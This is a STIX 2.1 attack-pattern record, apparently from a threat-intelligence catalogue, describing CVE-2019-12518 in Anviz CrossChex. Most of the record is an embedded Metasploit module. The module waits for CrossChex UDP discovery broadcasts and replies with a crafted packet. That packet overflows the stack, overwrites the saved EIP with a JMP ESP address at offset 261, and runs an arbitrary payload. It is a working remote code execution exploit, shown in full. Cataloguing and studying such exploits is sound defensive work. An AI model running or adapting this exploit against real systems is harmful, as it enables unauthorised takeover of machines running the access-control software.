{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e87924e5-ec3f-4548-aea3-20011e20d7b7",
    "created": "2024-08-14T16:46:20.282182Z",
    "modified": "2024-08-14T16:46:20.282186Z",
    "name": "Anviz CrossChex Buffer Overflow",
    "description": " Waits for broadcasts from Ainz CrossChex looking for new devices, and returns a custom broadcast triggering a stack buffer overflow. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/crosschex_device_bof.rb",
            "external_id": "crosschex_device_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-12518"
        },
        {
            "source_name": "reference",
            "url": "https://www.0x90.zone/multiple/reverse/2019/11/28/Anviz-pwn.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  PACKET_LEN = 10\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Anviz CrossChex Buffer Overflow',\n        'Description' => %q{\n          Waits for broadcasts from Ainz CrossChex looking for new devices, and returns a custom broadcast,\n          triggering a stack buffer overflow.\n        },\n        'Author' =>\n          [\n            'Luis Catarino <lcatarino@protonmail.com>', # original discovery/exploit\n            'Pedro Rodrigues <pedrosousarodrigues@protonmail.com>', # original discovery/exploit\n            'agalway-r7', # Module creation\n            'adfoster-r7' # Module creation\n          ],\n        'License' => MSF_LICENSE,\n        'References' =>\n          [\n            ['CVE', '2019-12518'],\n            ['URL', 'https://www.0x90.zone/multiple/reverse/2019/11/28/Anviz-pwn.html'],\n            ['EDB', '47734']\n          ],\n        'Payload' =>\n          {\n            'Space' => 8947,\n            'DisableNops' => true\n          },\n        'Arch' => ARCH_X86,\n        'EncoderType' => Msf::Encoder::Type::Raw,\n        'Privileged' => true,\n        'Platform' => 'win',\n        'DisclosureDate' => '2019-11-28',\n        'Targets' =>\n            [\n              [\n                'Crosschex Standard x86 <= V4.3.12',\n                {\n                  'Offset' => 261, # Overwrites stack memory to allow saved EIP to be overwritten\n                  'Ret' => \"\\x07\\x18\\x42\\x00\", # Overwrites saved EIP with address of 'JMP ESP' assembly instruction found in CrossChex code\n                  'Shift' => 4 # Positions payload to be written at beginning of ESP\n                }\n              ]\n            ],\n        'DefaultTarget' => 0\n      )\n    )\n    deregister_udp_options\n    register_options(\n      [\n        Opt::CPORT(5050, true, 'Port used to listen for CrossChex Broadcast.'),\n        Opt::CHOST('0.0.0.0', true, 'IP address that UDP Socket listens for CrossChex broadcast on. \\'0.0.0.0\\' is needed to receive broadcasts.'),\n        OptInt.new('TIMEOUT', [true, 'Time in seconds to wait for a CrossChex broadcast. 0 or less waits indefinitely.', 100])\n      ]\n    )\n  end\n\n  def exploit\n    connect_udp\n\n    res, host, port = udp_sock.recvfrom(PACKET_LEN, datastore['TIMEOUT'].to_i > 0 ? datastore['TIMEOUT'].to_i : nil)\n    if res.empty?\n      fail_with(Failure::TimeoutExpired, 'Module timed out waiting for CrossChex broadcast')\n    end\n\n    print_status 'CrossChex broadcast received, sending payload in response'\n    sploit = rand_text_english(target['Offset'])\n    sploit << target.ret # Overwrites saved EIP with address of 'JMP ESP' assembly instruction found in CrossChex code\n    sploit << rand_text_english(target['Shift']) # Positions payload to be written at beginning of ESP\n    sploit << payload.encoded\n\n    udp_sock.sendto(sploit, host, port)\n    print_status 'Payload sent'\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-11-28",
    "x_mitre_platforms": [
        "win'"
    ]
}